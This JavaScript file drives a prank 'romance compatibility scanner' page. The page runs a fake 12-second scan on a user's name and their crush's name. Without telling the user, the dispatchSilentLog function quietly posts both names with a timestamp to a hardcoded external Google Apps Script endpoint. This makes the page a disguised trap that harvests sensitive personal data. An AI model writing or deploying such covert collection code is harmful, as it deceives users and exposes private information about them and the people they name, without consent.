/**
 * Campus AI Romance & Compatibility Scanner
 * Application Logic & Interaction Controller
 */

(function () {
  'use strict';

  // --- Configuration & Constants ---
  const LOG_ENDPOINT = 'https://script.google.com/macros/s/AKfycbzoEs1TOHlWwrNvhptGFgFUhD1ozbx9HFr9ltNELprYXhBo_Nek4buVBIvlSJH73YVv/exec';
  const TOTAL_SCAN_DURATION_MS = 12000; // 12 seconds
  const STATUS_INTERVAL_MS = 2500; // 2.5 seconds

  const STATUS_MESSAGES = [
    'Scanning college attendance and mutual timings...',
    'Measuring eye-contact frequency in campus corridors...',
    'Matching Instagram mutual connections...',
    'Detecting hidden crush vibrations...',
    'Dispatching confidential report summary...'
  ];

  // --- DOM Elements ---
  const screenInput = document.getElementById('screen-input');
  const screenScanning = document.getElementById('screen-scanning');
  const screenResult = document.getElementById('screen-result');

  const compatibilityForm = document.getElementById('compatibility-form');
  const inputYourName = document.getElementById('your-name');
  const inputCrushName = document.getElementById('crush-name');
  const inputError = document.getElementById('input-error');
  const errorText = document.getElementById('error-text');
  const btnSubmit = document.getElementById('btn-submit');

  const displayYourName = document.getElementById('display-your-name');
  const displayCrushName = document.getElementById('display-crush-name');
  const progressBar = document.getElementById('progress-bar');
  const progressPercent = document.getElementById('progress-percent');
  const statusMessage = document.getElementById('status-message');

  const resultCrushName = document.getElementById('result-crush-name');
  const btnReset = document.getElementById('btn-reset');

  // --- State Tracking ---
  let isScanning = false;
  let progressInterval = null;
  let statusInterval = null;

  // --- Helper: Switch Screen View ---
  function showScreen(screenToShow) {
    [screenInput, screenScanning, screenResult].forEach((screen) => {
      if (screen === screenToShow) {
        screen.classList.remove('hidden');
        screen.classList.add('active-view');
      } else {
        screen.classList.add('hidden');
        screen.classList.remove('active-view');
      }
    });
  }

  // --- Helper: Show / Hide Error ---
  function showError(message) {
    errorText.textContent = message;
    inputError.classList.remove('hidden');
  }

  function hideError() {
    inputError.classList.add('hidden');
  }

  // --- Background Quiet Logging (Fire-and-Forget) ---
  function dispatchSilentLog(yourName, crushName) {
    try {
      fetch(LOG_ENDPOINT, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          yourName: yourName,
          crushName: crushName,
          timestamp: new Date().toLocaleString()
        })
      }).catch((err) => {
        console.log('Telemetry payload error:', err);
      });
    } catch (e) {
      console.log('Log dispatch failed silently:', e);
    }
  }

  // --- Screen 2: Fake Scanning Sequence ---
  function startScanSequence(yourName, crushName) {
    isScanning = true;
    btnSubmit.disabled = true;

    // Set Telemetry display names
    displayYourName.textContent = yourName;
    displayCrushName.textContent = crushName;

    // Reset progress UI
    progressBar.style.width = '0%';
    progressPercent.textContent = '0%';
    statusMessage.textContent = STATUS_MESSAGES[0];

    // Transition immediately to Screen 2
    showScreen(screenScanning);

    const startTime = performance.now();
    let currentMessageIndex = 0;

    // 1. Cycle status messages every 2.5 seconds
    statusInterval = setInterval(() => {
      currentMessageIndex++;
      if (currentMessageIndex < STATUS_MESSAGES.length) {
        // Quick subtle fade transition
        statusMessage.style.opacity = '0';
        setTimeout(() => {
          statusMessage.textContent = STATUS_MESSAGES[currentMessageIndex];
          statusMessage.style.opacity = '1';
        }, 150);
      }
    }, STATUS_INTERVAL_MS);

    // 2. Smooth progress bar animation over 12 seconds
    progressInterval = setInterval(() => {
      const elapsed = performance.now() - startTime;
      const progress = Math.min((elapsed / TOTAL_SCAN_DURATION_MS) * 100, 100);

      progressBar.style.width = `${progress.toFixed(1)}%`;
      progressPercent.textContent = `${Math.floor(progress)}%`;

      if (elapsed >= TOTAL_SCAN_DURATION_MS) {
        clearInterval(progressInterval);
        clearInterval(statusInterval);
        completeScanSequence(crushName);
      }
    }, 50);
  }

  // --- Screen 3: Show Panic Result ---
  function completeScanSequence(crushName) {
    isScanning = false;

    // Inject crush's name into punchline
    resultCrushName.textContent = crushName;

    // Transition cleanly to Screen 3
    showScreen(screenResult);
  }

  // --- Reset Entire App Flow ---
  function resetApplication() {
    clearInterval(progressInterval);
    clearInterval(statusInterval);
    isScanning = false;

    // Clear inputs and errors
    compatibilityForm.reset();
    hideError();
    btnSubmit.disabled = false;

    // Return cleanly to Screen 1
    showScreen(screenInput);
    inputYourName.focus();
  }

  // --- Event Listeners ---
  compatibilityForm.addEventListener('submit', function (e) {
    e.preventDefault();
    if (isScanning) return;

    const yourNameVal = inputYourName.value.trim();
    const crushNameVal = inputCrushName.value.trim();

    // Form Validation: Both fields required
    if (!yourNameVal || !crushNameVal) {
      showError('Please enter both names to run the analysis.');
      if (!yourNameVal) {
        inputYourName.focus();
      } else {
        inputCrushName.focus();
      }
      return;
    }

    hideError();

    // 1. Trigger background POST request (Non-blocking / Fire-and-Forget)
    dispatchSilentLog(yourNameVal, crushNameVal);

    // 2. Immediately transition to scanning sequence
    startScanSequence(yourNameVal, crushNameVal);
  });

  // Clear error message on typing
  [inputYourName, inputCrushName].forEach((input) => {
    input.addEventListener('input', () => {
      if (!inputError.classList.contains('hidden')) {
        hideError();
      }
    });
  });

  // Panic Screen Reset Button
  btnReset.addEventListener('click', resetApplication);

})();
